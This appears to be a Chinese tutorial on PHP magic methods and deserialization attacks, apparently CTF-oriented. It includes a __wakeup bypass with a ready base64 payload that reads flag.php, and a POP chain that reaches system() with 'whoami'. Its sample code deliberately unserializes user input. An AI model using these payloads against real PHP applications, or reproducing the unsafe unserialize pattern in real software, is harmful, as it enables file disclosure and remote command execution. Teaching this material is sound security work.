## 魔术方法

```
__construct(),类的构造函数
__destruct(),类的析构函数
__call(),在对象上下文中调用不可访问的方法时调用
__callStatic(),在静态上下文中调用不可访问的方法时调用
__get(),用于从不可访问的属性读取数据,有时可用于构造POP链
__set(),用于将数据写入不可访问的属性
__isset(),当对不可访问属性调用isset()或empty()时调用
__unset(),当对不可访问属性调用unset()时被调用
__sleep(),执行serialize()时,先会调用这个函数
__wakeup(),执行unserialize()时,先会调用这个函数
__toString(),类被当成字符串时的回应方法,有时可用于构造POP链
__invoke(),当脚本尝试将对象调用为函数时触发
```

### __sleep()与__wakeup()

```php
<?php 
class Demo{
    public function __construct($a,$b,$c){
        $this->a=$a;
        $this->b=$b;
        $this->c=$c;
        $this->str=sprintf("a %s,b %s,c %s",$this->a,$this->b,$this->c);
    }
    public function showstr(){
        echo $this->str.'<br>';
    }
    public function __sleep(){//serialize前调用
        echo __METHOD__.'<br>';
        return array('a','c');//只返回了$this->a和$this->c,返回需要被序列化存储的成员属性,删减不必要
    }
    public function __wakeup(){//unserialize前调用
        echo __METHOD__.'<br>';
        $this->str=sprintf("a %s,b %s,c %s",$this->a,$this->b,$this->c);
    }
}

highlight_file(__FILE__);
$test=new Demo('asdf','qwer','1234');
$test->showstr();
$s_test=serialize($test);
echo $s_test.'<br>';
$u_test=unserialize($s_test);
$u_test->showstr();
?>
```

```
a asdf,b qwer,c 1234
Demo::__sleep
O:4:"Demo":2:{s:1:"a";s:4:"asdf";s:1:"c";s:4:"1234";}
Demo::__wakeup
a asdf,b ,c 1234
```

### __toString()

```php
<?php 
class Demo{
    public function __construct($a,$b,$c){
        $this->a=$a;
        $this->b=$b;
        $this->c=$c;
        $this->str=sprintf("a %s,b %s,c %s",$this->a,$this->b,$this->c);
    }
    public function __toString(){
        return $this->str;
    }
}

highlight_file(__FILE__);
$test=new Demo('asdf','qwer','1234');
echo $test;
?>
```

```
a asdf,b qwer,c 1234
```

### 绕过__wakeup()

**当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行**

>仅使用于 PHP5<5.6.25 PHP7<7.0.10

```php
<?php 
class SoFun{ 
    protected $file='index.php';
    function __destruct(){
        if(!empty($this->file)) {
            if(strchr($this-> file,"\\")===false&&strchr($this->file, '/')===false){
                show_source(dirname (__FILE__).'/'.$this ->file);
            }
            else{
                die('Wrong filename.');
            }
        }
    }
    function __wakeup(){
        $this-> file='index.php';
    } 
    public function __toString(){
        return '';
    }
}     
if(!isset($_GET['file'])){ 
    show_source('index.php');
}
else{
    $file=base64_decode($_GET['file']);
    unserialize($file);
}
?>
```

`O:5:"SoFun":1:{s:7:"*file";s:9:"index.php";}`

`O:5:"SoFun":2:{s:7:"*file";s:8:"flag.php";}`

payload`?file=Tzo1OiJTb0Z1biI6Mjp7Uzo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9`

### __call()与__invoke()

在对象中调用一个不可访问方法时`__call()`会被调用

```php
<?php

class A
{
    public $class;
    public $parameter;

    public function __destruct()
    {
        if (isset($this->class) && isset($this->parameter)) {
            $this->class->system($this->parameter);
        }

    }
}

class B
{
    public function __call($callback,$parameter)#callback=system
    {
        call_user_func_array($callback,$parameter);
    }
}
$str = '???';
unserialize($str);
```

```php
<?php

class A
{
    public $class;
    public $parameter;
}

class B
{

}

$a=new A();
$b=new B();
$a->class=$b;
$a->parameter="whoami";
var_dump(serialize($a));
```

`O:1:"A":2:{s:5:"class";O:1:"B":0:{}s:9:"parameter";s:6:"whoami";}`

当尝试以调用函数的方式调用一个对象时`__invoke()`方法会被自动调用

```php
<?php

class A
{
    public function __invoke($a)
    {
        var_dump($a);
    }
}

$a = new A;
$a("asdf");
```